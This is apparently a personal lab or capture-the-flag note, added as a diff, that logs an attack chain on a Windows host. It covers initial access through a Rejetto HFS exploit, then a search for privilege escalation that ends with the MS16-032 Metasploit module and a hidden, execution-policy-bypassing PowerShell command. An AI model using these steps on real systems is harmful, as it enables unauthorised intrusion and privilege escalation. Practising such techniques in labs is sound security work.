@@ -1,0 +1,39 @@
+Possible vuln: exploit/windows/http/rejetto_hfs_exec
+
+! WORKS !
+
+User: X
+
+cd c:\users\administrator = permission denied
+
+Dont have full privileges. Use use post/multi/recon/local_exploit_suggester to get recommendations
+
+recommended by exploit suggester : exploit/windows/local/bypassuac_eventvwr
+EDIT: doesnt work... sniff. We dont belong to admins.
+
+
+
+After research found this: ms16_032_secondary_logon_handle_privesc
+
+! DOESNT WORK - research further duh. !
+
+!It does! Make sure the shell is same architecture as the os.
+E.g the hfs exploit uses x86 by default while the machine was x64!
+background the session, use the exploit with x64 (target 1) and run it
+
+
+?
+Also works for exploit: exploit/windows/local/ps_wmi_exec
+            exploit/windows/local/applocker_bypass
+?
+
+
+
+Administrator: X
+
+
+https://decoder.cloud/2017/02/21/the-system-challenge/
+Decoder's Blog Decoder
+The “SYSTEM” challenge
+ 
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command { Import-Module .\ms16_032.ps1 ; Invoke-MS16-032}
